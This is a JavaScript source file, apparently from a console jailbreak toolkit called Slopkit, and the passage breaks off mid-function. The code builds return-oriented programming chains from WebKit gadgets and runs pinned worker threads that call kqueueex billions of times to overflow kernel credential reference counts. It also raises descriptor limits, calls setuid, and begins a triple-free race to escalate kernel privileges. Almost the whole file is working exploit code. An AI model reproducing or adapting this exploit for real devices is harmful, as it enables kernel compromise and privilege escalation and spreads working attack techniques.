/*
 * SPDX-License-Identifier: MIT
 * Derived from p2jb-y2jb; see THIRD_PARTY_NOTICES.md.
 */
(function (root) {
    "use strict";

    const NS = root.Slopkit = root.Slopkit || {};
    const { U64, readU64LE, writeU32LE, writeU64LE } = NS;
    if (!U64 || !NS.PoopsKernel || !NS.RopChain)
        throw new Error("kernel.js must be loaded before p2jb.js");

    const LEAK_SYSCALLS = 0x100000001;
    const STATUS_WAITING = 1;
    const STATUS_BUSY = 2;
    const STATUS_EXITED = 0xdead;
    const STATUS_ABORTED = 0xbad;

    function delay(milliseconds) {
        return new Promise((resolve) => setTimeout(resolve, milliseconds));
    }

    class P2jbStagedBuffer {
        constructor(target) {
            this.target = target;
            this.address = target.address;
            this.size = target.size;
            this.label = `${target.label}-staged`;
            this.bytes = new Uint8Array(target.size);
        }

        check(offset, length) {
            if (!Number.isInteger(offset) || !Number.isInteger(length)
                || offset < 0 || length < 0 || offset + length > this.size)
                throw new RangeError(`${this.label}: out-of-bounds access`);
        }

        put64(offset, value) {
            this.check(offset, 8);
            writeU64LE(this.bytes, offset, value);
        }

        get64(offset) {
            this.check(offset, 8);
            return readU64LE(this.bytes, offset);
        }

        commit(length) {
            this.check(0, length);
            this.target.write(0, this.bytes.subarray(0, length));
        }
    }

    class P2jbBurnPlan {
        constructor(freeFds, workers, unroll) {
            for (const [name, value] of [["freeFds", freeFds],
                ["workers", workers], ["unroll", unroll]]) {
                if (!Number.isSafeInteger(value) || value <= 0)
                    throw new RangeError(`invalid P2JB ${name}`);
            }
            if (freeFds >= LEAK_SYSCALLS)
                throw new RangeError("P2JB free-fd count exceeds the overflow target");
            this.freeFds = freeFds;
            this.workers = workers;
            this.unroll = unroll;
            this.targetCalls = LEAK_SYSCALLS - freeFds;
            this.fullBlocks = Math.floor(this.targetCalls / unroll);
            this.remainder = this.targetCalls - this.fullBlocks * unroll;
            this.blocks = new Array(workers).fill(
                Math.floor(this.fullBlocks / workers));
            for (let index = 0; index < this.fullBlocks % workers; ++index)
                this.blocks[index]++;
            if (this.blocks.some((value) => value < 1))
                throw new RangeError("P2JB burn plan gives a worker no final gate");
            this.normalGates = this.blocks.map((value) => value - 1);
            this.finalRemainders = this.blocks.map((_, index) =>
                index === 0 ? this.remainder : 0);
            const reconstructed = this.blocks.reduce((sum, value) =>
                sum + value, 0) * unroll
                + this.finalRemainders.reduce((sum, value) => sum + value, 0);
            if (reconstructed !== this.targetCalls)
                throw new Error("P2JB burn plan is not exact");
            Object.freeze(this.blocks);
            Object.freeze(this.normalGates);
            Object.freeze(this.finalRemainders);
            Object.freeze(this);
        }

        completedCalls(counters, includeRemainder) {
            if (!Array.isArray(counters) || counters.length !== this.workers)
                throw new TypeError("P2JB counter vector has the wrong size");
            const blocks = counters.reduce((sum, value, index) => {
                if (!Number.isSafeInteger(value) || value < 0
                    || value > this.blocks[index])
                    throw new RangeError(`P2JB worker ${index} counter is invalid`);
                return sum + value;
            }, 0);
            return blocks * this.unroll + (includeRemainder ? this.remainder : 0);
        }
    }

    class P2jbBurnWorker {
        constructor(group, index, core, remainder) {
            this.group = group;
            this.kernel = group.kernel;
            this.index = index;
            this.core = core;
            this.remainder = remainder;
            const allocator = this.kernel.allocator;
            const unroll = group.plan.unroll;
            const stackSize = 0x4000
                + (unroll * 31 + remainder * 6 + 0x400) * 8;
            this.thread = allocator.alloc(8, 8, `p2jb-burn-${index}-thread`);
            this.context = allocator.alloc(0x120, 0x10,
                `p2jb-burn-${index}-context`);
            this.stack = allocator.alloc(stackSize, 0x10,
                `p2jb-burn-${index}-rop`);
            this.name = allocator.alloc(0x20, 8, `p2jb-burn-${index}-name`);
            this.name.putCString(0, `sk-p2-${index}`, 0x20);
            this.ready = allocator.alloc(8, 8, `p2jb-burn-${index}-ready`);
            this.counter = allocator.alloc(8, 8,
                `p2jb-burn-${index}-counter`);
            this.status = allocator.alloc(8, 8,
                `p2jb-burn-${index}-status`);
            this.affinityResult = allocator.alloc(8, 8,
                `p2jb-burn-${index}-affinity-result`);
            this.priorityResult = allocator.alloc(8, 8,
                `p2jb-burn-${index}-priority-result`);
            this.mask = allocator.alloc(0x10, 0x10,
                `p2jb-burn-${index}-cpuset`);
            this.mask.put8(core >>> 3, 1 << (core & 7));
            this.dummy = allocator.alloc(8, 8, `p2jb-burn-${index}-dummy`);
            this.pipe = [-1, -1];
            this.started = false;
            this.sent = 0;
            this.pivotSlot = 0;
            this.exitAddress = 0;
            this.abortAddress = 0;
            try {
                this.pipe = this.createGatePipe();
                this.build();
            } catch (error) {
                try { this.closePipes(); } catch {}
                throw error;
            }
        }

        createGatePipe() {
            const out = this.kernel.alloc(8, 4,
                `p2jb-burn-${this.index}-pipe-fds`);
            if (this.kernel.callI32("native.exports.pipe", [out.address]) !== 0)
                throw new Error(`P2JB burn worker ${this.index}: pipe failed`);
            const pair = [out.get32(0) | 0, out.get32(4) | 0];
            if (pair.some((fd) => fd < 0)) {
                for (const fd of pair) {
                    if (fd >= 0)
                        this.kernel.callI32("native.exports.close", [fd]);
                }
                throw new Error(`P2JB burn worker ${this.index}: bad pipe descriptors`);
            }
            const result = this.kernel.callI32("native.exports.fcntl",
                [pair[1], this.kernel.c.fSetfl, this.kernel.c.oNonblock]);
            if (result < 0) {
                for (const fd of pair)
                    this.kernel.callI32("native.exports.close", [fd]);
                throw new Error(`P2JB burn worker ${this.index}: nonblocking gate failed`);
            }
            return pair;
        }

        build() {
            const staged = new P2jbStagedBuffer(this.stack);
            const chain = new NS.RopChain(staged, this.kernel.profile,
                this.kernel.webkitBase);
            const k = (path) => this.kernel.k(path);
            const popRax = chain.gadget("popRax");
            const popRdi = chain.gadget("popRdi");
            const movStore = chain.gadget("movPtrRdiRax");
            const incCounter = this.kernel.webkitBase
                + this.kernel.profile.p2jbOffset("incDwordPtrRax");
            const repairs = [];
            const repairableCall = (target, args) => {
                chain.call(target, args);
            };
            const store = (address, value) => {
                chain.push(popRax); chain.push(value);
                chain.push(popRdi); chain.push(address);
                chain.push(movStore);
            };

            chain.call(k("native.exports.cpusetSetaffinity"),
                [3, 1, -1, 0x10, this.mask.address]);
            chain.storeRax(this.affinityResult.address);
            chain.call(k("native.exports.rtprioThread"),
                [1, 0, this.group.rtprio.address]);
            chain.storeRax(this.priorityResult.address);
            store(this.ready.address, 1);
            chain.call(k("native.exports.umtxOp"),
                [this.ready.address, this.group.umtxWake, 1, 0, 0]);
            chain.pivot(this.stack.address + 0x4000);

            chain.cursor = 0x4000;
            const loopAddress = this.stack.address + chain.cursor;
            const repairStart = chain.cursor;
            store(this.status.address, STATUS_WAITING);
            repairableCall(k("native.exports.read"),
                [this.pipe[0], this.dummy.address, 1]);
            store(this.status.address, STATUS_BUSY);
            for (let count = 0; count < this.group.plan.unroll; ++count)
                repairableCall(k("native.exports.kqueueex"),
                    [0x800000000000]);
            for (let offset = repairStart; offset < chain.cursor; offset += 8) {
                repairs.push({ address: this.stack.address + offset,
                    value: staged.get64(offset) });
            }
            const repairSectionOffset = chain.cursor;
            for (const repair of repairs) {
                chain.push(popRdi); chain.push(repair.address);
                chain.push(popRax); chain.push(repair.value);
                chain.push(movStore);
            }
            chain.push(popRax);
            chain.push(this.counter.address);
            chain.push(incCounter);
            chain.push(chain.gadget("popRsp"));
            this.pivotSlot = chain.push(loopAddress);

            this.exitAddress = this.stack.address + chain.cursor;
            for (let count = 0; count < this.remainder; ++count)
                chain.call(k("native.exports.kqueueex"), [0x800000000000]);
            store(this.status.address, STATUS_EXITED);
            chain.call(k("native.exports.pthreadExit"), [0]);

            this.abortAddress = this.stack.address + chain.cursor;
            store(this.status.address, STATUS_ABORTED);
            chain.call(k("native.exports.pthreadExit"), [0]);

            const at = (name) => this.kernel.profile.offset(
                `native.context.offsets.${name}`);
            const initialRip = staged.get64(0);
            this.repairStartOffset = repairStart;
            this.repairSectionOffset = repairSectionOffset;
            this.repairCount = repairs.length;
            this.chainBytes = chain.cursor;
            staged.commit(chain.cursor);
            this.context.put64(at("rip"), initialRip);
            this.context.put64(at("rsp"), this.stack.address + 8);
        }

        start() {
            const result = this.kernel.callI32("native.exports.pthreadCreate",
                [this.thread.address, 0,
                    this.kernel.k("native.context.setcontextEntry"),
                    this.context.address, this.name.address]);
            if (result !== 0)
                throw new Error(`P2JB burn worker ${this.index}: pthread_create ${result}`);
            this.started = true;
            if (this.thread.get64(0).isZero())
                throw new Error(`P2JB burn worker ${this.index}: empty pthread id`);
        }

        validateReady() {
            if (this.ready.get32(0) !== 1)
                throw new Error(`P2JB burn worker ${this.index}: ready mismatch`);
            const affinity = this.affinityResult.get64(0).toInt32();
            const priority = this.priorityResult.get64(0).toInt32();
            if (affinity !== 0 || priority !== 0)
                throw new Error(`P2JB burn worker ${this.index}: scheduling failed`
                    + ` affinity=${affinity} rt=${priority} core=${this.core}`);
        }

        terminalStatus() {
            const status = this.status.get32(0);
            return status === STATUS_EXITED || status === STATUS_ABORTED;
        }

        patchExit(abort) {
            this.kernel.memory.write64(this.pivotSlot,
                abort ? this.abortAddress : this.exitAddress);
        }

        closeGate() {
            if (this.pipe[1] >= 0) {
                const fd = this.pipe[1];
                const result = this.kernel.callI32("native.exports.close", [fd]);
                if (result !== 0)
                    throw new Error(`P2JB burn worker ${this.index}:`
                        + ` gate close(${fd})=${result}`);
                this.pipe[1] = -1;
            }
        }

        closePipes() {
            this.closeGate();
            if (this.pipe[0] >= 0) {
                const fd = this.pipe[0];
                const result = this.kernel.callI32("native.exports.close", [fd]);
                if (result !== 0)
                    throw new Error(`P2JB burn worker ${this.index}:`
                        + ` read gate close(${fd})=${result}`);
                this.pipe[0] = -1;
            }
        }

        join() {
            if (!this.started) return;
            if (!this.terminalStatus())
                throw new Error(`P2JB burn worker ${this.index}: refusing to join`
                    + ` status=0x${this.status.get32(0).toString(16)}`);
            const thread = this.thread.get64(0);
            if (thread.isZero())
                throw new Error(`P2JB burn worker ${this.index}: refusing to join`
                    + " without a pthread id");
            const result = this.kernel.callI32("native.exports.pthreadJoin",
                [thread, 0]);
            if (result !== 0)
                throw new Error(`P2JB burn worker ${this.index}: pthread_join ${result}`);
            this.started = false;
            this.closePipes();
        }
    }

    class P2jbBurnGroup {
        constructor(kernel, plan, cores) {
            if (!Array.isArray(cores) || cores.length !== plan.workers)
                throw new Error("P2JB burn core vector does not match its plan");
            this.kernel = kernel;
            this.plan = plan;
            this.umtxWait = kernel.off("kernel.constants.umtxWaitPrivate");
            this.umtxWake = kernel.off("kernel.constants.umtxWakePrivate");
            this.rtprio = kernel.alloc(4, 4, "p2jb-burn-rtprio");
            this.rtprio.put16(0, 2);
            this.rtprio.put16(2, kernel.t.realtimePriority);
            this.gateBytes = kernel.alloc(0x400, 0x10, "p2jb-burn-gates");
            this.gateBytes.fill(0x41);
            this.workers = [];
            try {
                for (let index = 0; index < cores.length; ++index) {
                    this.workers.push(new P2jbBurnWorker(this, index,
                        cores[index], plan.finalRemainders[index]));
                }
            } catch (error) {
                for (const worker of this.workers) {
                    try { worker.closePipes(); } catch {}
                }
                throw error;
            }
            this.stopped = false;
        }

        counters() { return this.workers.map((worker) => worker.counter.get32(0)); }

        writeGates(worker, count) {
            const amount = Math.min(count, this.gateBytes.size);
            const result = this.kernel.callI32("native.exports.write",
                [worker.pipe[1], this.gateBytes.address, amount]);
            if (result > amount)
                throw new Error(`P2JB burn worker ${worker.index}: oversized gate write`);
            return result > 0 ? result : 0;
        }

        async writeFinalGate(worker, timeoutMs) {
            const deadline = Date.now() + timeoutMs;
            while (Date.now() < deadline) {
                if (this.writeGates(worker, 1) === 1) return;
                await delay(25);
            }
            throw new Error(`P2JB burn worker ${worker.index}: final gate timed out`);
        }

        async waitFor(predicate, timeoutMs, label) {
            const deadline = Date.now() + timeoutMs;
            while (Date.now() < deadline) {
                if (predicate()) return true;
                await delay(Math.min(25, this.kernel.p2.pollIntervalMs));
            }
            if (predicate()) return true;
            throw new Error(`${label} timed out after ${timeoutMs}ms`);
        }

        async run(onProgress) {
            for (const worker of this.workers) worker.start();
            await this.waitFor(() => this.workers.every((worker) =>
                worker.ready.get32(0) === 1),
            this.kernel.p2.workerReadyTimeoutMs, "P2JB burn worker readiness");
            for (const worker of this.workers) worker.validateReady();
            const startedAt = Date.now();
            let lastCompleted = -1;
            let lastProgressAt = startedAt;
            while (true) {
                let allSent = true;
                for (const worker of this.workers) {
                    const target = this.plan.normalGates[worker.index];
                    const remaining = target - worker.sent;
                    if (remaining > 0) {
                        worker.sent += this.writeGates(worker, remaining);
                        allSent = false;
                    }
                }
                const counters = this.counters();
                for (let index = 0; index < counters.length; ++index) {
                    if (counters[index] > this.plan.normalGates[index])
                        throw new Error(`P2JB worker ${index} exceeded its gate budget`);
                }
                const completed = this.plan.completedCalls(counters, false);
                if (completed !== lastCompleted) {
                    lastCompleted = completed;
                    lastProgressAt = Date.now();
                    if (onProgress) {
                        const elapsed = (Date.now() - startedAt) / 1000;
                        const rate = completed / Math.max(elapsed, 0.001);
                        const eta = (this.plan.targetCalls - completed)
                            / Math.max(rate, 1);
                        onProgress(
                            Math.min(99.9,
                                completed * 100 / this.plan.targetCalls),
                            eta,
                            { counters,
                                sent: this.workers.map((worker) => worker.sent),
                                elapsedSeconds: elapsed,
                                completedCalls: completed,
                                targetCalls: this.plan.targetCalls });
                    }
                } else if (Date.now() - lastProgressAt
                    > this.kernel.p2.stallTimeoutMs) {
                    throw new Error("P2JB kqueueex counters made no progress for"
                        + ` ${this.kernel.p2.stallTimeoutMs}ms`);
                }
                const allComplete = counters.every((value, index) =>
                    value === this.plan.normalGates[index]);
                if (allSent && allComplete) break;
                await delay(this.kernel.p2.pollIntervalMs);
            }

            await this.waitFor(() => this.workers.every((worker) =>
                worker.status.get32(0) === STATUS_WAITING),
            this.kernel.p2.workerExitTimeoutMs,
            "P2JB burn worker final read gate");
            for (const worker of this.workers) {
                if (worker.status.get32(0) !== STATUS_WAITING)
                    throw new Error(`P2JB worker ${worker.index} is not at its read gate`);
                worker.patchExit(false);
            }
            for (const worker of this.workers)
                await this.writeFinalGate(worker,
                    this.kernel.p2.workerExitTimeoutMs);

            await this.waitFor(() => {
                const observed = this.counters();
                return this.workers.every((worker, index) =>
                    worker.status.get32(0) === STATUS_EXITED
                    && observed[index] === this.plan.blocks[index]);
            }, Math.max(this.kernel.p2.workerExitTimeoutMs,
                this.kernel.p2.stallTimeoutMs), "P2JB burn worker exit");
            const counters = this.counters();
            for (const worker of this.workers) {
                if (worker.status.get32(0) !== STATUS_EXITED
                    || counters[worker.index] !== this.plan.blocks[worker.index])
                    throw new Error(`P2JB worker ${worker.index} did not exit exactly`);
            }
            if (this.plan.completedCalls(counters, true) !== this.plan.targetCalls)
                throw new Error("P2JB completed counter total is not exact");
            for (const worker of this.workers) worker.join();
            this.stopped = true;
            if (onProgress) onProgress(100, 0, { counters,
                sent: this.workers.map((worker) => worker.sent + 1),
                elapsedSeconds: (Date.now() - startedAt) / 1000,
                completedCalls: this.plan.targetCalls,
                targetCalls: this.plan.targetCalls });
            return counters;
        }

        async abort() {
            if (this.stopped) return [];
            const warnings = [];
            for (const worker of this.workers) {
                if (!worker.started) continue;
                try { worker.patchExit(true); } catch (error) {
                    warnings.push(error.message);
                }
                try { worker.closeGate(); } catch (error) {
                    warnings.push(error.message);
                }
            }
            try {
                await this.waitFor(() => this.workers.every((worker) =>
                    !worker.started || worker.terminalStatus()),
                this.kernel.p2.workerExitTimeoutMs,
                "P2JB burn worker abort");
            } catch (error) {
                warnings.push(error.message);
            }
            for (const worker of this.workers) {
                if (worker.started && worker.terminalStatus()) {
                    try { worker.join(); } catch (error) {
                        warnings.push(error.message);
                    }
                }
                if (!worker.started) {
                    try { worker.closePipes(); } catch (error) {
                        warnings.push(error.message);
                    }
                } else {
                    warnings.push(`P2JB burn worker ${worker.index} remains live;`
                        + " cold power cycle required");
                }
            }
            this.stopped = this.workers.every((worker) => !worker.started);
            return warnings;
        }
    }

    class P2jbKernel extends NS.PoopsKernel {
        constructor(options) {
            super(Object.assign({}, options, { triggerFamily: "overflow" }));
            const metadata = this.profile.p2jbConfig();
            this.p2 = Object.assign({}, metadata.config);
            // Topologies are firmware/runtime contracts, unlike the common
            // burn geometry. Profiles must supply an ordered list explicitly.
            this.p2.coreTopologies = metadata.firmware?.coreTopologies;
            this.burnWorkerCount = this.p2.defaultBurnWorkers;
            this.onPreflightProgress = options?.onPreflightProgress || null;
            this.t = Object.assign({}, this.t, {
                ipv6Sockets: this.p2.ipv6Sockets,
                mainCore: this.p2.mainCore
            });
            this.staleCredential = U64.zero();
            this.processSeed = null;
            this.raceStabilized = false;
            this.sealed = false;
            this.p2jbPreflightResult = null;
            this.p2jbPreflightPromise = null;
            this.selectedCoreTopology = null;
            this.resourcePolicy = {
                requiresSeal: true,
                // The external payload/app lifecycle can suspend this
                // renderer.  Destroy the transient P2JB kernel transport
                // before handing control to elfldr's client.
                sealBeforePayloadDelivery: true,
                retainAllocator: true,
                retainMemory: true,
                expectedParkedWorkers: 0,
                closeSafe: false
            };
        }

        p2off(name) { return this.profile.p2jbOffset(name); }
        fileDataOffset() { return this.p2off("fileData"); }
        fileRefcountOffset() { return this.p2off("fileRefcount"); }
        socketPcbOffset() { return this.p2off("socketPcb"); }

        preflightProgress(phase, detail) {
            this.markProgress(`P2JB-${phase}`, detail);
            if (this.onPreflightProgress) {
                try { this.onPreflightProgress(phase, detail); } catch {}
            }
        }

        verifyCounterGadget() {
            const probe = this.alloc(8, 8, "p2jb-counter-gadget-probe");
            const stack = this.alloc(0x100, 0x10,
                "p2jb-counter-gadget-stack");
            const chain = new NS.RopChain(stack, this.profile, this.webkitBase);
            chain.push(chain.gadget("popRax"));
            chain.push(probe.address);
            chain.push(this.webkitBase + this.p2off("incDwordPtrRax"));
            this.bridge.callChain(chain.buffer, chain.cursor);
            if (probe.get32(0) !== 1 || probe.get32(4) !== 0)
                throw new Error("P2JB live counter gadget semantic probe failed");
            this.markProgress("P2JB-GADGET-PROBE", "inc32=verified");
        }

        coreTopologyCandidates() {
            const key = "burnCoresDefault";
            const candidates = this.p2.coreTopologies;
            if (!Array.isArray(candidates) || candidates.length === 0)
                throw new Error("P2JB core topology list is empty");
            return candidates.map((candidate, index) => {
                if (!candidate || typeof candidate !== "object")
                    throw new Error(`P2JB core topology ${index} is invalid`);
                const mainCore = candidate.mainCore;
                const configuredCores = candidate[key];
                if (!Number.isSafeInteger(mainCore)
                    || mainCore < 0 || mainCore >= 128
                    || !Array.isArray(configuredCores)
                    || configuredCores.length !== this.burnWorkerCount
                    || new Set(configuredCores).size !== configuredCores.length
                    || configuredCores.some((core) =>
                        !Number.isSafeInteger(core) || core < 0 || core >= 128
                        || core === mainCore)) {
                    throw new Error(`P2JB core topology ${index} is invalid`);
                }
                return { index, mainCore, burnCores: configuredCores.slice(),
                    workerCount: this.burnWorkerCount };
            });
        }

        chooseCoreTopology(allowedCores) {
            if (!Array.isArray(allowedCores) || allowedCores.length === 0)
                throw new Error("P2JB renderer affinity is empty");
            const allowed = new Set(allowedCores);
            for (const candidate of this.coreTopologyCandidates()) {
                if (allowed.has(candidate.mainCore)
                    && candidate.burnCores.every((core) => allowed.has(core)))
                    return candidate;
            }
            throw new Error(`P2JB has no profiled ${this.burnWorkerCount}-worker`
                + ` core topology for renderer affinity ${allowedCores.join(",")}`);
        }

        // PoopsKernel historically falls back to the first live controller
        // CPU.  P2JB cannot do that because its worker layout is an ordered,
        // firmware-specific contract.  Resolve the whole topology before the
        // base class pins the controller or starts its native worker pool.
        pinMainThread() {
            const liveMask = this.alloc(0x10, 0x10,
                "p2jb-core-topology-live-mask");
            const result = this.callI32("native.exports.cpusetGetaffinity",
                [3, 1, -1, 0x10, liveMask.address]);
            if (result !== 0) {
                throw new Error(`P2JB core topology query failed: result=${result}`
                    + ` errno=${this.lastErrno() ?? "unavailable"}`);
            }
            const selection = this.chooseCoreTopology(
                this.affinityCores(liveMask));
            this.selectedCoreTopology = selection;
            this.t.mainCore = selection.mainCore;
            super.pinMainThread();
            if (this.mainCore !== selection.mainCore)
                throw new Error("P2JB controller core selection changed while pinning");
        }

        selectBurnCores() {
            const allowedCores = this.affinityCores(this.mainOriginalAffinity);
            const allowed = new Set(allowedCores);
            let selection = this.selectedCoreTopology;
            if (!selection || selection.workerCount !== this.burnWorkerCount) {
                selection = this.chooseCoreTopology(allowedCores);
            } else if (!allowed.has(selection.mainCore)
                || !selection.burnCores.every((core) => allowed.has(core))) {
                throw new Error("P2JB selected core topology left the live affinity mask");
            }
            this.selectedCoreTopology = selection;
            this.mainCore = selection.mainCore;
            if (this.t) this.t.mainCore = selection.mainCore;
            const cores = selection.burnCores;
            this.preflightProgress("CORE-PLAN",
                `mask=${this.maskHex(this.mainOriginalAffinity)}`
                + ` main=${this.mainCore} workers=${cores.join(",")}`
                + ` topology=${selection.index}`);
            return cores;
        }

        verifyBurnCoreAffinity(cores) {
            const requested = this.alloc(0x10, 0x10,
                "p2jb-burn-core-probe-request");
            const observed = this.alloc(0x10, 0x10,
                "p2jb-burn-core-probe-observed");
            const controller = this.alloc(0x10, 0x10,
                "p2jb-burn-core-probe-controller");
            controller.put8(this.mainCore >>> 3,
                1 << (this.mainCore & 7));
            let failure = null;
            try {
                for (const core of cores) {
                    requested.fill(0);
                    requested.put8(core >>> 3, 1 << (core & 7));
                    const setResult = this.callI32(
                        "native.exports.cpusetSetaffinity",
                        [3, 1, -1, 0x10, requested.address]);
                    if (setResult !== 0) {
                        const errno = this.lastErrno();
                        throw new Error(`P2JB burn core ${core} affinity probe`
                            + ` failed: result=${setResult}`
                            + ` errno=${errno ?? "unavailable"}`);
                    }
                    observed.fill(0);
                    const getResult = this.callI32(
                        "native.exports.cpusetGetaffinity",
                        [3, 1, -1, 0x10, observed.address]);
                    const selected = getResult === 0
                        ? this.affinityCores(observed) : [];
                    if (getResult !== 0 || selected.length !== 1
                        || selected[0] !== core) {
                        const errno = getResult === 0 ? null : this.lastErrno();
                        throw new Error(`P2JB burn core ${core} affinity probe`
                            + ` readback failed: result=${getResult}`
                            + ` selected=${selected.join(",")}`
                            + ` errno=${errno ?? "unavailable"}`);
                    }
                }
            } catch (error) {
                failure = error;
            }

            let restoreFailure = null;
            try {
                const result = this.callI32(
                    "native.exports.cpusetSetaffinity",
                    [3, 1, -1, 0x10, controller.address]);
                if (result !== 0) {
                    const errno = this.lastErrno();
                    restoreFailure = new Error(`P2JB controller core`
                        + ` ${this.mainCore} restore failed: result=${result}`
                        + ` errno=${errno ?? "unavailable"}`);
                } else {
                    observed.fill(0);
                    const getResult = this.callI32(
                        "native.exports.cpusetGetaffinity",
                        [3, 1, -1, 0x10, observed.address]);
                    const selected = getResult === 0
                        ? this.affinityCores(observed) : [];
                    if (getResult !== 0 || selected.length !== 1
                        || selected[0] !== this.mainCore) {
                        const errno = getResult === 0
                            ? null : this.lastErrno();
                        restoreFailure = new Error(`P2JB controller core`
                            + ` ${this.mainCore} restore readback failed:`
                            + ` result=${getResult}`
                            + ` selected=${selected.join(",")}`
                            + ` errno=${errno ?? "unavailable"}`);
                    }
                }
            } catch (error) {
                restoreFailure = error;
            }
            if (failure || restoreFailure) {
                const message = [failure?.message, restoreFailure?.message]
                    .filter(Boolean).join("; ");
                throw new Error(message);
            }
            this.preflightProgress("CORE-PROBE",
                `main=${this.mainCore} workers=${cores.join(",")} verified=true`);
        }

        raiseFdLimit() {
            const limit = this.alloc(16, 8, "p2jb-rlimit");
            this.preflightProgress("RLIMIT-BEGIN", "resource=NOFILE");
            const result = this.callI32("native.exports.getrlimit",
                [8, limit.address]);
            if (result !== 0)
                throw new Error(`P2JB getrlimit failed ${result}`
                    + ` errno=${this.lastErrno() ?? "unavailable"}`);
            const before = limit.get64(0);
            const hard = limit.get64(8);
            if (hard.isZero())
                throw new Error("P2JB RLIMIT_NOFILE hard limit is zero");
            const target = U64.from(this.p2.fdLimitTarget);
            let requested = before;
            if (requested.compare(target) < 0)
                requested = hard.compare(target) < 0 ? hard : target;
            if (requested.compare(before) > 0) {
                // Preserve rlim_max. Only raise the soft limit as far as this
                // bounded WebKit port needs; copying an unexpectedly huge hard
                // limit made the following descriptor walk needlessly costly.
                limit.put64(0, requested);
                const raised = this.callI32("native.exports.setrlimit",
                    [8, limit.address]);
                if (raised !== 0)
                    throw new Error(`P2JB setrlimit failed ${raised}`
                        + ` errno=${this.lastErrno() ?? "unavailable"}`);
            }
            const verified = this.callI32("native.exports.getrlimit",
                [8, limit.address]);
            if (verified !== 0)
                throw new Error(`P2JB getrlimit verification failed ${verified}`
                    + ` errno=${this.lastErrno() ?? "unavailable"}`);
            const after = limit.get64(0);
            if (after.compare(requested) < 0)
                throw new Error(`P2JB RLIMIT_NOFILE remained ${after.toHex()}`
                    + ` below ${requested.toHex()}`);
            this.preflightProgress("RLIMIT", `before=${before.toHex()}`
                + ` hard=${hard.toHex()} requested=${requested.toHex()}`
                + ` after=${after.toHex()}`);
            return { before, hard, requested, after };
        }

        checkedSetuid(label) {
            const result = this.callI32("native.exports.setuid", [1]);
            if (result !== 0) {
                const errorNumber = this.lastErrno();
                throw new Error(`P2JB ${label} setuid(1) failed ${result}`
                    + ` errno=${errorNumber === null ? "unavailable" : errorNumber}`);
            }
            this.markProgress(`P2JB-${label}-SETUID`, "result=0");
        }

        fdFactory() {
            for (const path of ["/dev/", "/", "/app0/", "/dev/urandom",
                "/dev/notification0", "/dev/gc"]) {
                const buffer = this.alloc(path.length + 1, 1, "p2jb-fd-path");
                buffer.putCString(0, path, path.length + 1);
                const first = this.callI32("native.exports.open", [buffer.address, 0]);
                if (first < 0) continue;
                const second = this.callI32("native.exports.open", [buffer.address, 0]);
                this.callI32("native.exports.close", [first]);
                if (second < 0) continue;
                this.callI32("native.exports.close", [second]);
                const factory = () => this.callI32("native.exports.open",
                    [buffer.address, 0]);
                factory.source = path;
                this.preflightProgress("FD-SOURCE", `path=${path}`);
                return factory;
            }
            const factory = () => this.callI32("native.exports.socket",
                [this.c.afInet6, this.c.sockDgram, 0]);
            factory.source = "AF_INET6/SOCK_DGRAM";
            this.preflightProgress("FD-SOURCE", "fallback=ipv6-dgram");
            return factory;
        }

        async probeFdBudget(factory) {
            const probed = [];
            const target = this.p2.freeFdCap + this.p2.fdBudgetMargin;
            let probeFailure = null;
            let stopErrno = null;
            this.preflightProgress("FD-PROBE-BEGIN",
                `target=${target} batch=${this.p2.fdProbeBatch}`);
            try {
                for (let index = 0; index < target; ++index) {
                    const fd = factory();
                    if (fd < 0) {
                        stopErrno = this.lastErrno();
                        break;
                    }
                    probed.push(fd);
                    if (probed.length % this.p2.fdProbeHeartbeat === 0) {
                        this.preflightProgress("FD-PROBE-PROGRESS",
                            `opened=${probed.length}/${target}`);
                    }
                    if (probed.length % this.p2.fdProbeBatch === 0)
                        await delay(this.p2.fdProbeYieldMs);
                }
            } catch (error) {
                probeFailure = error;
            }

            const closeFailures = [];
            for (let base = 0; base < probed.length;
                base += this.p2.fdProbeBatch) {
                const end = Math.min(probed.length,
                    base + this.p2.fdProbeBatch);
                for (let index = base; index < end; ++index) {
                    try {
                        const result = this.callI32("native.exports.close",
                            [probed[index]]);
                        if (result !== 0)
                            closeFailures.push(`${probed[index]}:${result}`);
                    } catch (error) {
                        closeFailures.push(`${probed[index]}:${error.message}`);
                    }
                }
                await delay(this.p2.fdProbeYieldMs);
            }
            if (probeFailure)
                throw new Error(`P2JB descriptor probe failed after`
                    + ` ${probed.length}: ${probeFailure.message}`);
            if (closeFailures.length)
                throw new Error(`P2JB descriptor probe cleanup failed: `
                    + closeFailures.slice(0, 8).join(","));
            const usable = Math.min(this.p2.freeFdCap,
                probed.length - this.p2.fdBudgetMargin);
            const raceEstimate = this.p2.ipv6Sockets + 19;
            const minimum = raceEstimate + this.p2.minimumFdHeadroom;
            if (usable < minimum)
                throw new Error(`P2JB fd budget ${usable}/${probed.length}`
                    + ` is below the profiled minimum ${minimum}`);
            this.preflightProgress("FD-PROBE-COMPLETE",
                `opened=${probed.length} usable=${usable}`
                + ` source=${factory.source}`
                + ` stopErrno=${stopErrno ?? "cap"}`);
            return { probed: probed.length, usable,
                capped: probed.length === target, stopErrno };
        }

        async burnCredentialReferences(freeFds, cores) {
            const plan = new P2jbBurnPlan(freeFds, this.burnWorkerCount,
                this.p2.burnUnroll);
            this.markProgress("P2JB-BURN-PLAN",
                `calls=${plan.targetCalls} workers=${plan.workers}`
                + ` blocks=${plan.fullBlocks} tail=${plan.remainder}`);
            const group = new P2jbBurnGroup(this, plan, cores);
            this.burnWorkers = group;
            const burnStartedAt = Date.now();
            let counters;
            try {
                counters = await group.run((percent, eta, detail) => {
                    if (this.onBurnProgress)
                        this.onBurnProgress(percent, eta, detail);
                });
            } finally {
                if (!group.stopped) {
                    const warnings = await group.abort();
                    if (warnings.length)
                        this.markProgress("P2JB-BURN-ABORT",
                            warnings.join("; "));
                }
                if (group.stopped) this.burnWorkers = null;
            }
            const elapsedMs = Date.now() - burnStartedAt;
            this.markProgress("P2JB-BURN-COMPLETE",
                `counters=${counters.join(",")} calls=`
                + plan.completedCalls(counters, true)
                + ` elapsedMs=${elapsedMs}`);
            return plan;
        }

        async overflowRace() {
            let lastError = null;
            const attemptLimit = Math.min(this.p2.tripleFreeAttempts,
                Math.floor((this.freeFds.length - this.freeFdIdx - 1) / 3));
            if (attemptLimit < 1)
                throw new Error("P2JB free-fd pool cannot support one race attempt");
            this.markProgress("P2JB-RACE-BUDGET", `attempts=${attemptLimit}`);
            for (let attempt = 0; attempt < attemptLimit; ++attempt) {
                let recvState = null;
                const dispatchRecv = () => {
                    try {
                        this.pool.recv.dispatch([this.iovSockets[0],
                            this.buffers.msg.address, 0], false);
